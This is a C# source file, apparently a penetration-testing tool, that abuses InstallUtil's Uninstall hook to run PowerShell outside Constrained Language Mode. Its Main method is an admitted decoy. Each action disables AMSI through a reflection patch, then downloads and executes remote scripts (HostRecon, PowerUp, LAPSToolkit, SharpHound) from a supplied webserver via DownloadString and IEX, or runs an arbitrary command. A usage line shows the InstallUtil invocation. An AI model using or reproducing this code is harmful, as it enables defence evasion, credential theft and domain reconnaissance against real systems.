using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace ClmBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //instantiate custom runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            string cmd = "";
            string webserver = this.Context.Parameters["webserver"];
            string action = this.Context.Parameters["action"];
            string command = this.Context.Parameters["command"];

            //instanciate  powershell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            Console.WriteLine("Webserver: " + webserver + "; Action: " + action);
            //Powershell commands
            if ((!string.IsNullOrEmpty(webserver)) && (!string.IsNullOrEmpty(action)))
            {
                //for recon only    
                if (action == "recon")
                { 
                    cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*InitFailed') {$e.SetValue($null,$true)}}; sleep 1; (New-Object System.Net.WebClient).DownloadString('http://"+ webserver + "/HostRecon.ps1') | IEX; Invoke-HostRecon >> output; (New-Object System.Net.WebClient).DownloadString('http://" + webserver + "/PowerUp.ps1') | IEX; Invoke-AllChecks >> output;"; 
                }
                //laps
                else if(action == "laps")
                {
                    cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*InitFailed') {$e.SetValue($null,$true)}}; sleep 1; (New-Object System.Net.WebClient).DownloadString('http://" + webserver + "/LAPSToolkit.ps1') | IEX; sleep 1; Get-LAPSComputers >> output-laps";
                }
                //bloodhound
                else if (action == "sharphound")
                {
                    cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*InitFailed') {$e.SetValue($null,$true)}}; sleep 1; (New-Object System.Net.WebClient).DownloadString('http://" + webserver + "/SharpHound.ps1') | IEX; sleep 1; Invoke-BloodHound -collectionMethod All -zipfilename sharphound.zip";
                }
                //powershell command
                else if ((action == "cmd") && !string.IsNullOrEmpty(command))
                {
                    cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*InitFailed') {$e.SetValue($null,$true)}}; sleep 1; " + command;
                }
            }
            else
            {
                Console.WriteLine("Mandatory parameters missing 'webserver' and/or action. To invoke do: \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /webserver=web server ip address:port> /action=<recon | laps | sharphound | cmd> /U c:Bypass.exe\n Note if using the action = cmd include /command=<powershell command>");
                rs.Close();
            }

            Console.WriteLine("Executing: " + cmd);

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}